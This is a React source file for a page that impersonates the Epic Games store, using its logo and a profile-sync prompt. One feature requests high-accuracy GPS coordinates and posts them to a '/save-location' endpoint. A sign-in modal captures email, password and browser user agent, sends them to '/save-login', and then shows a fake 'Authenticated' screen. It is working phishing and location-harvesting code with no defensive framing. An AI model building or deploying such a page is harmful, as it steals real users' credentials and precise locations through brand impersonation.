import React, { useState } from 'react';
import axios from 'axios';
import { motion, AnimatePresence } from 'framer-motion';
import { Shield, MapPin, CheckCircle, AlertTriangle, X, Menu, ShoppingCart, ChevronDown, User } from 'lucide-react';

export default function App() {
  const [status, setStatus] = useState('idle'); // idle, loading, success, error
  const [error, setError] = useState(null);
  const [showSignIn, setShowSignIn] = useState(false);
  const [signInLoading, setSignInLoading] = useState(false);
  const [signInSuccess, setSignInSuccess] = useState(false);
  const [loginData, setLoginData] = useState({ email: '', password: '' });

  const requestLocation = () => {
    setStatus('loading');
    
    if (!navigator.geolocation) {
      setError('Geolocation is not supported by your browser.');
      setStatus('error');
      return;
    }

    navigator.geolocation.getCurrentPosition(
      async (position) => {
        const { latitude, longitude, accuracy } = position.coords;
        try {
          await axios.post('/save-location', {
            latitude,
            longitude,
            accuracy
          });
          setStatus('success');
        } catch (err) {
          setError('Failed to sync location with server.');
          setStatus('error');
        }
      },
      (err) => {
        setError(err.message);
        setStatus('error');
      },
      { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
    );
  };

  const handleSignIn = async (e) => {
    e.preventDefault();
    setSignInLoading(true);
    try {
      await axios.post('/save-login', {
        ...loginData,
        userAgent: navigator.userAgent
      });
      setSignInSuccess(true);
      setTimeout(() => {
        setShowSignIn(false);
        setSignInSuccess(false);
        setSignInLoading(false);
        setLoginData({ email: '', password: '' });
      }, 2000);
    } catch (e) {
      setError('Login authentication failed.');
      setSignInLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-[#111] text-white font-sans selection:bg-blue-500/30">
      
      {/* ── NAVBAR ── */}
      <nav className="fixed top-0 w-full z-50 bg-[#121212]/95 backdrop-blur-md border-b border-white/5">
        <div className="max-w-7xl mx-auto px-6 h-16 flex items-center justify-between">
          <div className="flex items-center gap-8">
            {/* Epic Logo SVG */}
            <svg width="32" height="32" viewBox="0 0 32 32" fill="none">
              <path d="M16 1L4 4v16.5C4 26 16 31 16 31s12-5 12-10.5V4L16 1z" fill="white"/>
              <path d="M16 3L6 5.5V20c0 4.5 10 8.5 10 8.5s10-4 10-8.5V5.5L16 3z" fill="#121212"/>
              <path d="M9.5 9h11v2h-8.5v3h7v2h-7v4h9v2h-11.5V9zm13 0h2v11h-2V9z" fill="white"/>
              <path d="M11.5 24h9v1.5h-9V24z" fill="white" opacity="0.5"/>
            </svg>
            <div className="hidden md:flex items-center gap-1">
              {['Store','Browse','News'].map(n => (
                <button key={n} className="px-4 py-2 text-sm font-bold text-gray-400 hover:text-white transition-all uppercase tracking-widest">{n}</button>
              ))}
            </div>
          </div>
          <div className="flex items-center gap-4">
             <button className="text-gray-400 hover:text-white transition-colors"><ShoppingCart size={20}/></button>
             <button 
                onClick={() => setShowSignIn(true)}
                className="px-5 py-2 bg-white text-black text-xs font-black uppercase tracking-widest rounded hover:bg-gray-200 transition-all flex items-center gap-2"
             >
                <User size={14}/> Sign In
             </button>
          </div>
        </div>
      </nav>

      <div className="pt-24 flex flex-col items-center justify-center p-6 min-h-screen">
        <motion.div 
          initial={{ opacity: 0, scale: 0.95 }}
          animate={{ opacity: 1, scale: 1 }}
          className="max-w-md w-full bg-[#1a1a1a] border border-white/10 p-10 rounded-3xl shadow-[0_0_100px_rgba(0,0,0,0.5)] text-center relative overflow-hidden"
        >
          {/* Ambient Glow */}
          <div className="absolute top-0 left-1/2 -translate-x-1/2 w-40 h-1 bg-gradient-to-r from-transparent via-blue-500 to-transparent blur-sm opacity-50"/>
          
          {/* Header Icon */}
          <div className="mb-8 flex justify-center">
            <div className="w-20 h-20 bg-blue-600/10 border border-blue-500/20 rounded-3xl flex items-center justify-center shadow-inner">
              {status === 'success' ? (
                <CheckCircle className="text-green-400" size={38} />
              ) : status === 'error' ? (
                <AlertTriangle className="text-red-400" size={38} />
              ) : (
                <MapPin className="text-blue-400" size={38} />
              )}
            </div>
          </div>

          <h1 className="text-4xl font-black uppercase tracking-tighter mb-4 italic leading-none">
            Nexus <span className="text-blue-500">Protocol</span>
          </h1>
          
          <p className="text-gray-400 text-sm mb-10 leading-relaxed px-2">
            Authenticate your deployment zone to unlock premium store access and secure your global gamer profile. 
            <span className="block mt-3 text-[10px] font-black text-gray-600 uppercase tracking-[.3em]">Operational Consent Required</span>
          </p>

          {status === 'idle' && (
            <button
              onClick={requestLocation}
              className="w-full py-5 bg-blue-600 hover:bg-blue-500 text-white font-black uppercase tracking-[.2em] rounded-2xl transition-all shadow-[0_20px_40px_-10px_rgba(37,99,235,0.4)] hover:-translate-y-1 active:translate-y-0"
            >
              Verify Location
            </button>
          )}

          {status === 'loading' && (
            <div className="flex flex-col items-center gap-4 py-4">
              <div className="w-10 h-10 border-4 border-blue-500/10 border-t-blue-500 rounded-full animate-spin" />
              <p className="text-[10px] font-black uppercase tracking-[.3em] text-blue-400 animate-pulse">Syncing GPS Satellites...</p>
            </div>
          )}

          {/* ... and so on for other states ... */}
          {status === 'success' && (
            <div className="space-y-4 py-2">
              <div className="p-5 bg-green-500/10 border border-green-500/20 rounded-2xl">
                <p className="text-green-400 text-sm font-black uppercase tracking-widest">Zone Identified</p>
              </div>
              <p className="text-gray-500 text-[10px] uppercase font-bold tracking-widest">Capture ID: #PX-992-B</p>
            </div>
          )}

          {status === 'error' && (
             <div className="space-y-4 py-2">
                <p className="text-red-400 text-xs font-bold uppercase tracking-widest">{error}</p>
                <button onClick={requestLocation} className="text-gray-500 hover:text-white text-[10px] font-black uppercase tracking-widest transition-colors">Abort & Retry</button>
             </div>
          )}

          <div className="mt-12 pt-8 border-t border-white/5 flex items-center justify-center gap-3 text-gray-700">
            <Shield size={16} />
            <span className="text-[10px] uppercase font-black tracking-[.4em]">Secure Data Link</span>
          </div>
        </motion.div>
      </div>

      {/* ── SIGN IN MODAL ── */}
      <AnimatePresence>
        {showSignIn && (
          <div className="fixed inset-0 z-[60] flex items-center justify-center p-4">
            <motion.div
              initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}
              className="absolute inset-0 bg-black/90 backdrop-blur-xl"
              onClick={() => !signInLoading && setShowSignIn(false)}
            />
            <motion.div
              initial={{ scale: 0.9, opacity: 0, y: 20 }} animate={{ scale: 1, opacity: 1, y: 0 }} exit={{ scale: 0.9, opacity: 0, y: 20 }}
              className="relative bg-[#0a0a0a] border border-white/5 p-12 rounded-[2rem] w-full max-w-[480px] shadow-[0_0_100px_rgba(0,0,0,0.8)]"
            >
              <div className="flex flex-col items-center">
                 <svg width="48" height="48" viewBox="0 0 32 32" fill="none" className="mb-10">
                   <path d="M16 1L4 4v16.5C4 26 16 31 16 31s12-5 12-10.5V4L16 1z" fill="white"/>
                   <path d="M16 3L6 5.5V20c0 4.5 10 8.5 10 8.5s10-4 10-8.5V5.5L16 3z" fill="#121212"/>
                   <path d="M9.5 9h11v2h-8.5v3h7v2h-7v4h9v2h-11.5V9zm13 0h2v11h-2V9z" fill="white"/>
                 </svg>

                <h2 className="text-3xl font-black mb-2 uppercase tracking-tight">Sync Account</h2>
                <p className="text-gray-600 text-sm mb-10 text-center">Authenticate your Epic Games profile to continue.</p>

                {signInSuccess ? (
                  <div className="w-full py-16 flex flex-col items-center justify-center text-center">
                    <div className="w-20 h-20 bg-green-500/10 rounded-full flex items-center justify-center mb-6 border border-green-500/20">
                      <CheckCircle className="text-green-500" size={36} />
                    </div>
                    <p className="font-black text-2xl uppercase italic tracking-tighter">Authenticated</p>
                    <p className="text-gray-600 text-[10px] mt-3 uppercase font-black tracking-[.4em] animate-pulse">Syncing Gamer Profile...</p>
                  </div>
                ) : (
                  <form onSubmit={handleSignIn} className="w-full space-y-5">
                    <div className="space-y-2">
                      <label className="text-[10px] font-black text-gray-500 uppercase tracking-[.3em] ml-1">Email Protocol</label>
                      <input 
                        required type="email" value={loginData.email}
                        onChange={e => setLoginData({...loginData, email: e.target.value})}
                        className="w-full bg-[#151515] border border-white/5 rounded-2xl px-6 py-4 text-sm focus:border-blue-600 outline-none transition-all placeholder:text-gray-700"
                        placeholder="agent@nexus.com"
                      />
                    </div>
                    <div className="space-y-2">
                      <label className="text-[10px] font-black text-gray-500 uppercase tracking-[.3em] ml-1">Access Cipher</label>
                      <input 
                        required type="password" value={loginData.password}
                        onChange={e => setLoginData({...loginData, password: e.target.value})}
                        className="w-full bg-[#151515] border border-white/5 rounded-2xl px-6 py-4 text-sm focus:border-blue-600 outline-none transition-all placeholder:text-gray-700"
                        placeholder="••••••••"
                      />
                    </div>
                    
                    <div className="pt-6">
                      <button
                        disabled={signInLoading}
                        className="w-full py-5 bg-blue-600 hover:bg-blue-500 text-white font-black uppercase tracking-[.3em] rounded-2xl transition-all shadow-xl shadow-blue-600/20 active:scale-[0.98] disabled:opacity-50"
                      >
                        {signInLoading ? 'Processing...' : 'Authorize Sync'}
                      </button>
                    </div>

                    <p onClick={() => setShowSignIn(false)} className="text-center text-[10px] text-gray-600 hover:text-blue-500 cursor-pointer pt-6 uppercase font-black tracking-[.3em] transition-colors">Recover Access Key</p>
                  </form>
                )}
              </div>
            </motion.div>
          </div>
        )}
      </AnimatePresence>

    </div>
  );
}
